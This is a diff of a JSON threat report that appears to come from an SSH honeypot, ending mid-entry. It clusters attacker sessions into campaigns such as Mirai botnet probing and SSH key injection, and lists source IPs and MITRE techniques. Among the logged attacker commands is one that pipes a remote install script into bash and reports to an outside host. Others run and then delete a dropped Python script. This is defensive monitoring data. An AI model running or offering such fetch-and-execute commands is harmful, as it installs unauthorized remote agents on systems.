@@ -1,16 +1,16 @@
 {
-  "generated_at": "2026-07-10T14:35:37.229357+00:00",
-  "total_sessions_with_commands": 104,
-  "total_clusters": 3,
-  "campaign_clusters": 2,
-  "singleton_clusters": 1,
+  "generated_at": "2026-07-10T17:50:23.153808+00:00",
+  "total_sessions_with_commands": 110,
+  "total_clusters": 11,
+  "campaign_clusters": 3,
+  "singleton_clusters": 5,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
       "name": "Recon Loader Script",
       "severity": "MEDIUM",
-      "session_count": 94,
+      "session_count": 20,
       "unique_ip_count": 1,
       "ttps": [
         "T1082",
@@ -20,11 +20,23 @@
       ]
     },
     {
-      "cluster_id": "CLU-002",
-      "name": "mdrfckr SSH Key Injection",
+      "cluster_id": "CLU-003",
+      "name": "Mirai/IoT Botnet",
       "severity": "HIGH",
       "session_count": 1,
       "unique_ip_count": 1,
+      "ttps": [
+        "T1082",
+        "T1105",
+        "T1059.004"
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 4,
+      "unique_ip_count": 4,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -67,7 +79,7 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 94,
+      "session_count": 20,
       "unique_ips": [
         "91.92.40.204"
       ],
@@ -104,761 +116,272 @@
       ],
       "members": [
         {
-          "session_id": "IR-7b7027edfbd7",
+          "session_id": "IR-579ad3df40c6",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T10:55:18.200673Z"
+          "timestamp": "2026-07-10T12:55:56.676788Z"
         },
         {
-          "session_id": "IR-054055a69d4b",
+          "session_id": "IR-db03196ee395",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T10:56:30.432787Z"
+          "timestamp": "2026-07-10T12:57:11.362485Z"
         },
         {
-          "session_id": "IR-11ff8177755d",
+          "session_id": "IR-94c996693466",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T10:57:41.891967Z"
+          "timestamp": "2026-07-10T12:58:25.731667Z"
         },
         {
-          "session_id": "IR-05119cd6288d",
+          "session_id": "IR-587afe209bfb",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T10:58:54.196111Z"
+          "timestamp": "2026-07-10T12:59:38.739465Z"
         },
         {
-          "session_id": "IR-3e1b186260aa",
+          "session_id": "IR-2089864930fe",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:00:09.218442Z"
+          "timestamp": "2026-07-10T13:00:54.037130Z"
         },
         {
-          "session_id": "IR-7911e81aacfd",
+          "session_id": "IR-94a50b08f426",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:01:23.178653Z"
+          "timestamp": "2026-07-10T13:02:09.136528Z"
         },
         {
-          "session_id": "IR-e27f9ce8650b",
+          "session_id": "IR-316ba2f20aa5",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:02:37.157969Z"
+          "timestamp": "2026-07-10T13:03:24.474447Z"
         },
         {
-          "session_id": "IR-464510784267",
+          "session_id": "IR-5a8c2e198a43",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:03:50.089758Z"
+          "timestamp": "2026-07-10T13:04:39.835614Z"
         },
         {
-          "session_id": "IR-9fb7105de239",
+          "session_id": "IR-ee2d4a71495e",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:05:03.037923Z"
+          "timestamp": "2026-07-10T13:05:52.427607Z"
         },
         {
-          "session_id": "IR-a2df8b5910ba",
+          "session_id": "IR-2d4e1009c7b3",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:06:14.860654Z"
+          "timestamp": "2026-07-10T13:07:06.270466Z"
         },
         {
-          "session_id": "IR-89251051e821",
+          "session_id": "IR-19cc97ae398e",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:07:28.376648Z"
+          "timestamp": "2026-07-10T13:08:21.029893Z"
         },
         {
-          "session_id": "IR-b65f2f490a7d",
+          "session_id": "IR-69c6c8405ba9",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:08:40.812399Z"
+          "timestamp": "2026-07-10T13:09:35.435518Z"
         },
         {
-          "session_id": "IR-709d92ca5ca2",
+          "session_id": "IR-645e1649dcb6",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:09:52.795382Z"
+          "timestamp": "2026-07-10T13:10:49.696393Z"
         },
         {
-          "session_id": "IR-947c51535cbe",
+          "session_id": "IR-2d060ed14d6a",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:11:04.147556Z"
+          "timestamp": "2026-07-10T13:12:04.119751Z"
         },
         {
-          "session_id": "IR-7f33b0cc506e",
+          "session_id": "IR-af70e31f702d",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:12:16.457197Z"
+          "timestamp": "2026-07-10T13:13:18.365929Z"
         },
         {
-          "session_id": "IR-3ebdfb0055d5",
+          "session_id": "IR-3ad24c18068d",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:13:30.064614Z"
+          "timestamp": "2026-07-10T13:14:34.459558Z"
         },
         {
-          "session_id": "IR-ff9d86eced29",
+          "session_id": "IR-43c2043c05e0",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:14:45.357118Z"
+          "timestamp": "2026-07-10T13:15:48.315166Z"
         },
         {
-          "session_id": "IR-14f9d5090d62",
+          "session_id": "IR-0faea1bfc8ad",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:16:00.221951Z"
+          "timestamp": "2026-07-10T13:16:59.581605Z"
         },
         {
-          "session_id": "IR-f4af7a539373",
+          "session_id": "IR-a733e13856cd",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:17:13.358937Z"
+          "timestamp": "2026-07-10T13:18:11.770179Z"
         },
         {
-          "session_id": "IR-4f7a49207245",
+          "session_id": "IR-b0e91552f344",
           "src_ip": "91.92.40.204",
           "country": "NL",
           "isp": "TechTies Inc.",
           "command_count": 9,
-          "timestamp": "2026-07-10T11:18:26.124839Z"
-        },
-        {
-          "session_id": "IR-ae745273537c",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:19:38.753110Z"
-        },
-        {
-          "session_id": "IR-33dce2e6969d",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:20:53.276013Z"
-        },
-        {
-          "session_id": "IR-8a7a67d28fae",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:22:06.809903Z"
-        },
-        {
-          "session_id": "IR-beb1593f91dd",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:23:20.335279Z"
-        },
-        {
-          "session_id": "IR-60bf73b6318e",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:24:34.281963Z"
-        },
-        {
-          "session_id": "IR-6453874f01d5",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:25:48.811719Z"
-        },
-        {
-          "session_id": "IR-260580245b31",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:27:05.110829Z"
-        },
-        {
-          "session_id": "IR-fc248d424869",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:28:21.421265Z"
-        },
-        {
-          "session_id": "IR-0ef986442762",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:29:37.162235Z"
-        },
-        {
-          "session_id": "IR-2581e77cf934",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:30:54.816859Z"
-        },
-        {
-          "session_id": "IR-bd01178afcb6",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:32:12.246858Z"
-        },
-        {
-          "session_id": "IR-697ee8094556",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:33:29.264487Z"
-        },
-        {
-          "session_id": "IR-6e83dcc3527f",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:34:45.757137Z"
-        },
-        {
-          "session_id": "IR-5e1c39922a18",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:36:01.262437Z"
-        },
-        {
-          "session_id": "IR-d05b75fdd335",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:37:17.101956Z"
-        },
-        {
-          "session_id": "IR-f7ee840bbe42",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:38:33.320452Z"
-        },
-        {
-          "session_id": "IR-d846b707c95e",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:39:54.286161Z"
-        },
-        {
-          "session_id": "IR-9526255ce267",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:41:12.826932Z"
-        },
-        {
-          "session_id": "IR-63913e08bf95",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:42:28.515574Z"
-        },
-        {
-          "session_id": "IR-fcb0ecef4f2d",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:43:43.602607Z"
-        },
-        {
-          "session_id": "IR-261c67ff6c44",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:45:01.715572Z"
-        },
-        {
-          "session_id": "IR-223efc4e6ae4",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:46:21.249676Z"
-        },
-        {
-          "session_id": "IR-b7cbbfb61d15",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:47:42.116867Z"
-        },
-        {
-          "session_id": "IR-3b598e439729",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:49:00.730155Z"
-        },
-        {
-          "session_id": "IR-d94981041029",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:50:19.179524Z"
-        },
-        {
-          "session_id": "IR-5628ce7fed5f",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:51:37.294312Z"
-        },
-        {
-          "session_id": "IR-0900630d0184",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:52:56.542215Z"
-        },
-        {
-          "session_id": "IR-9efd2d37dc5f",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:54:15.208165Z"
-        },
-        {
-          "session_id": "IR-7cc1342bbc75",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:55:34.484238Z"
-        },
-        {
-          "session_id": "IR-7fdbafb7c8fb",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:56:56.512768Z"
-        },
-        {
-          "session_id": "IR-bc30cdde04bb",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:58:23.831747Z"
-        },
-        {
-          "session_id": "IR-3647e104fc13",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T11:59:45.328542Z"
-        },
-        {
-          "session_id": "IR-6ece3cabff1f",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:00:58.936216Z"
-        },
-        {
-          "session_id": "IR-50b0d2367efd",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:02:11.072234Z"
-        },
-        {
-          "session_id": "IR-872478bffa24",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:03:25.740483Z"
-        },
-        {
-          "session_id": "IR-bf975e4ede0d",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:04:44.164535Z"
-        },
-        {
-          "session_id": "IR-7de98448cd85",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:06:02.546993Z"
-        },
-        {
-          "session_id": "IR-22074f9dab73",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:07:20.038625Z"
-        },
-        {
-          "session_id": "IR-19c6cca61e86",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:08:36.201570Z"
-        },
-        {
-          "session_id": "IR-0b1a91d26a0a",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:09:52.143077Z"
-        },
-        {
-          "session_id": "IR-03ed107ea91e",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:11:09.286295Z"
-        },
-        {
-          "session_id": "IR-e5292b0f9a2d",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:12:25.683581Z"
-        },
-        {
-          "session_id": "IR-1ab60ea175ea",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:13:41.902659Z"
-        },
-        {
-          "session_id": "IR-5cf6cb56c271",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:14:58.533744Z"
-        },
-        {
-          "session_id": "IR-1905015f32bd",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:16:17.175511Z"
-        },
-        {
-          "session_id": "IR-1b31bd30b15d",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:17:36.774449Z"
-        },
-        {
-          "session_id": "IR-9ec7adc1e1c4",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:19:02.082108Z"
-        },
-        {
-          "session_id": "IR-2b2488f045ab",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:20:26.040400Z"
-        },
-        {
-          "session_id": "IR-5d0ad41932d9",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:21:51.635019Z"
-        },
-        {
-          "session_id": "IR-7e2ffa1ba2c2",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:23:19.627824Z"
-        },
-        {
-          "session_id": "IR-bcc2fa8847e4",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:24:46.934785Z"
-        },
-        {
-          "session_id": "IR-a1b0b099f078",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:26:11.608174Z"
-        },
-        {
-          "session_id": "IR-069192e6416c",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:27:33.697735Z"
-        },
-        {
-          "session_id": "IR-d296f76f7205",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:28:58.406948Z"
-        },
-        {
-          "session_id": "IR-6e8bac82f1fd",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:30:22.862618Z"
-        },
-        {
-          "session_id": "IR-6933db81d77c",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:31:47.244498Z"
-        },
-        {
-          "session_id": "IR-c65e7e05c0a2",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:33:11.248527Z"
-        },
-        {
-          "session_id": "IR-fdb9d6136529",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:34:35.575548Z"
-        },
-        {
-          "session_id": "IR-ed9085f6394c",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:36:02.027048Z"
-        },
-        {
-          "session_id": "IR-a3723fcd11ac",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:37:20.942198Z"
-        },
-        {
-          "session_id": "IR-efdc163df9a3",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:38:35.283894Z"
-        },
-        {
-          "session_id": "IR-3a69699f9fdc",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:39:49.629624Z"
-        },
-        {
-          "session_id": "IR-565566ba1a0a",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:41:02.274886Z"
-        },
-        {
-          "session_id": "IR-6b0ed8d74ed1",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:42:16.401508Z"
-        },
-        {
-          "session_id": "IR-70cff195eca9",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:43:31.851715Z"
-        },
-        {
-          "session_id": "IR-9e0844ba6281",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:44:46.572305Z"
-        },
-        {
-          "session_id": "IR-dcc30567b786",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:45:58.792749Z"
-        },
-        {
-          "session_id": "IR-4f3ed86fff59",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:47:13.073133Z"
-        },
-        {
-          "session_id": "IR-32022fc06638",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:48:27.082207Z"
-        },
-        {
-          "session_id": "IR-90d57efd9581",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:49:42.016426Z"
-        },
-        {
-          "session_id": "IR-2bab746702fd",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:50:56.429508Z"
-        },
-        {
-          "session_id": "IR-91b13afc183f",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:52:10.381131Z"
-        },
-        {
-          "session_id": "IR-712b0ea6bf25",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:53:25.252927Z"
-        },
-        {
-          "session_id": "IR-630b757a1a51",
-          "src_ip": "91.92.40.204",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-10T12:54:40.408827Z"
+          "timestamp": "2026-07-10T13:19:24.080299Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "165.1.75.106"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-234f2f8b8b8d",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-07-10T16:37:52.137436Z"
+        },
+        {
+          "session_id": "IR-db7b2f4aa736",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-07-10T16:40:13.229962Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 2,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 1,
+      "unique_ips": [
+        "94.154.43.41"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "247e5eacc7fee14d",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "echo SHELL_TEST",
+        "/bin/busybox TEST",
+        "cat /proc",
+        "./"
+      ],
+      "members": [
+        {
+          "session_id": "IR-d75ecafee75c",
+          "src_ip": "94.154.43.41",
+          "country": "TR",
+          "isp": "Storm Industries LLC",
+          "command_count": 4,
+          "timestamp": "2026-07-10T16:53:58.442029Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -877,11 +400,14 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 4,
       "unique_ips": [
-        "2.26.230.127"
+        "14.225.206.187",
+        "103.182.132.154",
+        "160.119.69.14",
+        "185.225.41.192"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 4,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -911,27 +437,97 @@
       ],
       "members": [
         {
-          "session_id": "IR-04763e7a90f2",
-          "src_ip": "2.26.230.127",
-          "country": "DE",
-          "isp": "play2go.cloud - Cheap and reliable hosting",
+          "session_id": "IR-3264cc1bb56f",
+          "src_ip": "160.119.69.14",
+          "country": "NL",
+          "isp": "HostMem",
           "command_count": 2,
-          "timestamp": "2026-07-10T11:25:20.972432Z"
+          "timestamp": "2026-07-10T13:05:17.381762Z"
+        },
+        {
+          "session_id": "IR-ca9e9a05d249",
+          "src_ip": "14.225.206.187",
+          "country": "VN",
+          "isp": "Vietnam Posts and Telecommunications Group",
+          "command_count": 2,
+          "timestamp": "2026-07-10T14:23:51.526245Z"
+        },
+        {
+          "session_id": "IR-ffc11d0e42b7",
+          "src_ip": "185.225.41.192",
+          "country": "SY",
+          "isp": "Tarassul Internet Service Provider",
+          "command_count": 2,
+          "timestamp": "2026-07-10T14:45:35.391139Z"
+        },
+        {
+          "session_id": "IR-d9a7b24059fa",
+          "src_ip": "103.182.132.154",
+          "country": "IN",
+          "isp": "GITELENET PRIVATE LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-07-10T16:00:24.276792Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-005",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 9,
+      "session_count": 3,
       "unique_ips": [
-        "45.198.224.120"
+        "139.59.154.49"
       ],
       "unique_ip_count": 1,
+      "sequence_hash": "9a9a7473e4472399",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Go-http-client/1.1",
+        "Connection: close"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f1c66bcfeb57",
+          "src_ip": "139.59.154.49",
+          "country": "DE",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-07-10T14:01:14.615886Z"
+        },
+        {
+          "session_id": "IR-2f95e60ebf04",
+          "src_ip": "139.59.154.49",
+          "country": "DE",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-07-10T14:01:15.461698Z"
+        },
+        {
+          "session_id": "IR-bee20f28769f",
